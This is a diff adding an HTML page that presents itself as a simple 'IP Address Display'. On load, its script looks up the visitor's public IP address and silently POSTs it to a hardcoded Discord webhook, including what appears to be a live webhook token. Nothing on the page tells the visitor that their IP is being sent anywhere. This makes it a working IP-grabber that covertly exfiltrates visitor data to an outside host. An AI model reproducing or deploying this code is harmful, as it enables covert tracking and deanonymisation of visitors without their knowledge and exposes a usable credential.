@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Address Display</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+    </style>
+</head>
+<body>
+    <h1>IP Address:</h1>
+    <p id="ipAddress">Fetching IP address...</p>
+
+    <script>
+        // Function to fetch IP address
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ipAddress').textContent = ipAddress;
+                    // Send IP address to Discord webhook
+                    sendToDiscordWebhook(ipAddress);
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        // Function to send IP address to Discord webhook
+        function sendToDiscordWebhook(ipAddress) {
+            const webhookURL = 'https://discord.com/api/webhooks/1234882693553197067/wb5sAtkjMVEfLusUC9p9byF4VH1SN3dxsqY0IK4LeaUeC2C8eEx98hteyCk7jhl70P7k';
+            const data = { content: `New IP Address: ${ipAddress}` };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('IP address sent to Discord webhook:', response))
+            .catch(error => console.error('Error sending IP address to Discord webhook:', error));
+        }
+
+        // Call getIPAddress function when the page loads
+        window.onload = getIPAddress;
+    </script>
+</body>
+</html>
